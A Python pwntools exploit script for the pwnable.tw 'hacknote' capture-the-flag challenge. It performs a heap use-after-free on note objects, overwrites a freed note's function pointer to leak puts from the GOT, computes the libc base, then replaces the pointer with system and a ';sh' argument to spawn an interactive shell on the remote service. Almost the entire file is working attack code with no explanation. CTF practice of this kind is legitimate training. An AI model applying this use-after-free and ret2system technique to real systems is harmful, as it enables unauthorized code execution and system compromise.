#!/usr/bin/env python3
from pwn import *

PORT = 10102
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./hacknote_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x0804872C
            b* 0x08048879
            b* 0x0804893D
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def menu(idx):
    p.sendlineafter(b"Your choice :", str(idx).encode())

def add(size, data):
    menu(1)
    p.sendafter(b"size :", str(size).encode())
    p.sendafter(b"Content :", data)

def delete(idx):
    menu(2)
    p.sendafter(b"Index :", str(idx).encode())

def print(idx):
    menu(3) 
    p.sendafter(b"Index :", str(idx).encode())

add(0x40, b"A"*0x40)
add(0x40, b"B"*0x40)
# GDB()
delete(0)
delete(1)

pl = flat(
    0x804862B,  # puts_addr
    elf.got.puts
    )

# GDB()
add(0x8, pl)
print(0)
puts_leak = u32(p.recvn(4))
libc.address = puts_leak - libc.sym.puts

system = libc.sym.system

log.success(f'puts leak : {puts_leak:#x}')
log.success(f'libc base: {libc.address:#x}')

delete(2)
pl = flat(
    system,
    ";sh\0"
)

add(0x8, pl)
print(0)

p.interactive()